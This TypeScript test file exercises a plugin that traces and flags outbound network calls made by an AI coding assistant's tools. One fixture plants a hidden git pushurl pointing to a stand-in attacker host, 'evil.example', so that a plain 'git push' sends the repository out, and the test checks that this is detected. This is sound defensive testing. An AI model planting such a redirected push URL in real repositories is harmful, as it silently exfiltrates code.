import { expect, mock, test } from 'claude-code/testing'
import type { On } from 'claude-code'

function world(on: On, opts: { fs?: boolean; cwd?: boolean } = {}) {
  mock.clock(on, { now: Date.UTC(2026, 9, 2, 12) })
  if (opts.cwd !== false) on('session.cwd', () => ({ value: '/repo' }) as never)
  if (opts.fs !== false) {
    on('fs.read', () => {
      throw new Error('ENOENT')
    })
    on('fs.stat', () => {
      throw new Error('ENOENT')
    })
  }
  on('command.register', () => ({ value: undefined }) as never)
  on('ui.open', () => ({ isPlaced: true }) as never)
  on('ui.blit', () => ({}) as never)
}

const ok = () => ({ result: 'ok' })
const fail = () => ({ isError: true as const, result: 'x', text: 'x' })
const PANE_PROPS = { title: 'Netrunner Trace', isFocused: true, bodyColumns: 100, placement: 'dock', scroll: { offset: 0, bodyRows: 30 }, view: {} } as never
const BAND_PROPS = { hasSurvey: false, isWorking: false, maxRows: 4, bodyColumns: 100, scroll: { offset: 0, bodyRows: 4 }, view: {} } as never

test('outbound Bash, WebFetch and MCP calls are traced with their hosts and outcome', async ($, on) => {
  world(on)
  on('tool.call', (_$, e) => (e.tool === 'Bash' && String((e as { command?: string }).command).includes('pip') ? fail() : ok()))
  await $.tool.call({ tool: 'Bash', command: 'npm install left-pad' })
  await $.tool.call({ tool: 'Bash', command: 'pip install nope' })
  await $.tool.call({ tool: 'WebFetch', url: 'https://docs.example.com/x', prompt: 'p' } as never)
  await $.tool.call({ tool: 'mcp__linear__list_issues' } as never)
  await $.tool.call({ tool: 'Bash', command: 'ls -la' })
  const res = await $.command.run({ command: 'trace', args: 'hosts', origin: { kind: 'composer' }, presentation: { isFullscreen: false, columns: 100 } } as never)
  const text = String((res as { text?: string }).text)
  expect(text).toMatch(/4 outbound calls to 4 hosts/)
  expect(text).toMatch(/registry\.npmjs\.org/)
  expect(text).toMatch(/pypi\.org\s+1 call, 1 failed/)
  expect(text).toMatch(/unexpected \(docs\.example\.com\)/)
  expect(text).toMatch(/mcp:linear  1 call \(destination unknown\)/)
})

test('a bare git push resolves the remote from a worktree .git file, before the push runs', async ($, on) => {
  world(on, { fs: false })
  const files: Record<string, string> = {
    '/repo/.git': 'gitdir: /main/.git/worktrees/wt\n',
    '/main/.git/worktrees/wt/commondir': '../..\n',
    '/main/.git/worktrees/wt/HEAD': 'ref: refs/heads/feature\n',
    '/main/.git/config': '[remote "origin"]\n\turl = https://github.com/me/r\n\tpushurl = git@evil.example:me/r.git\n',
  }
  on('fs.stat', (_$, e) => {
    const path = (e as { path: string }).path
    if (path === '/repo/.git') return { value: { kind: 'file', size: 1, mtimeMs: 0, isLink: false } } as never
    return { deny: 'ENOENT' } as never
  })
  on('fs.read', (_$, e) => {
    const path = (e as { path: string }).path
    if (files[path] !== undefined) return { value: files[path] } as never
    return { deny: `ENOENT ${path}` } as never
  })
  let ran = 0
  on('tool.call', () => {
    ran += 1
    return ok()
  })
  await $.tool.call({ tool: 'Bash', command: 'git push' })
  expect(ran).toBe(1)
  const res = await $.command.run({ command: 'trace', args: 'hosts', origin: { kind: 'composer' }, presentation: { isFullscreen: false, columns: 100 } } as never)
  expect(String((res as { text?: string }).text)).toMatch(/unexpected \(evil\.example\)/)
})

test('bookkeeping failures never stop the tool from running', async ($, on) => {
  world(on, { cwd: false })
  on('session.cwd', () => {
    throw new Error('boom')
  })
  let ran = 0
  on('tool.call', () => {
    ran += 1
    return ok()
  })
  const res = await $.tool.call({ tool: 'Bash', command: 'npm install x' })
  expect(ran).toBe(1)
  expect(res.isError).toBeUndefined()
})

test('/trace allow clears the unexpected flag for that host', async ($, on) => {
  world(on)
  on('tool.call', ok)
  await $.tool.call({ tool: 'Bash', command: 'curl https://weird.example.net/a' })
  const run = (args: string) => $.command.run({ command: 'trace', args, origin: { kind: 'composer' }, presentation: { isFullscreen: false, columns: 100 } } as never)
  expect(String(((await run('hosts')) as { text?: string }).text)).toMatch(/unexpected/)
  await run('allow example.net')
  expect(String(((await run('hosts')) as { text?: string }).text)).not.toMatch(/unexpected/)
})

test('the pane draws a Raster map on the terminal and text on the desktop', async ($, on) => {
  world(on)
  on('tool.call', ok)
  await $.tool.call({ tool: 'Bash', command: 'gh pr list' })
  const term = await $.ui.mount({ plugin: 'netrunner-trace', surface: 'terminal', component: 'Pane', requestId: 'netrunner-trace', props: PANE_PROPS })
  expect(await term.find({ type: 'Raster', key: 'map' })).toBeDefined()
  expect(await term.find({ type: 'Text', text: /NETRUNNER TRACE/ })).toBeDefined()
  expect(await term.find({ type: 'Text', text: /gh pr -> github\.com/ })).toBeDefined()
  await term.unmount()
  const desk = await $.ui.mount({ plugin: 'netrunner-trace', surface: 'desktop', component: 'Pane', requestId: 'netrunner-trace', props: PANE_PROPS })
  expect(await desk.find({ type: 'Raster' })).toBeUndefined()
  expect(await desk.find({ type: 'Text', text: /github\.com/ })).toBeDefined()
  await desk.unmount()
})

test('the ticker shows recent hosts and keeps the bands beneath it', async ($, on) => {
  world(on)
  on('tool.call', ok)
  on('ui.render', { component: 'AbovePrompt' }, () => h('Text', {}, 'BENEATH') as never)
  for (const surface of ['terminal', 'desktop'] as const) {
    const quiet = await $.ui.mount({ plugin: 'netrunner-trace', surface, component: 'AbovePrompt', props: BAND_PROPS })
    expect(await quiet.find({ text: /trace/ })).toBeUndefined()
    await quiet.unmount()
  }
  await $.tool.call({ tool: 'Bash', command: 'curl https://unknown.example.org' })
  for (const surface of ['terminal', 'desktop'] as const) {
    const band = await $.ui.mount({ plugin: 'netrunner-trace', surface, component: 'AbovePrompt', props: BAND_PROPS })
    expect(await band.find({ type: 'Text', text: /unknown\.example\.org/ })).toBeDefined()
    expect(await band.find({ type: 'Text', text: 'BENEATH' })).toBeDefined()
    await band.unmount()
  }
})

test('calls with no network target pass through untouched', async ($, on) => {
  world(on)
  let runs = 0
  on('tool.call', () => {
    runs += 1
    return ok()
  })
  await $.tool.call({ tool: 'Read', file_path: '/repo/a.ts' } as never)
  await $.tool.call({ tool: 'Bash', command: 'npm test' })
  expect(runs).toBe(2)
  const res = await $.command.run({ command: 'trace', args: 'hosts', origin: { kind: 'composer' }, presentation: { isFullscreen: false, columns: 100 } } as never)
  expect(String((res as { text?: string }).text)).toMatch(/no outbound traffic/)
})

test('host names that look like object properties are recorded like any other', async ($, on) => {
  world(on)
  on('tool.call', ok)
  for (const host of ['constructor', 'toString', '__proto__']) await $.tool.call({ tool: 'Bash', command: `curl http://${host}/x` })
  const res = await $.command.run({ command: 'trace', args: 'hosts', origin: { kind: 'composer' }, presentation: { isFullscreen: false, columns: 100 } } as never)
  const text = String((res as { text?: string }).text)
  expect(text).toMatch(/3 outbound calls to 3 hosts/)
  for (const host of ['constructor', 'tostring', '__proto__']) expect(text).toContain(host)
})
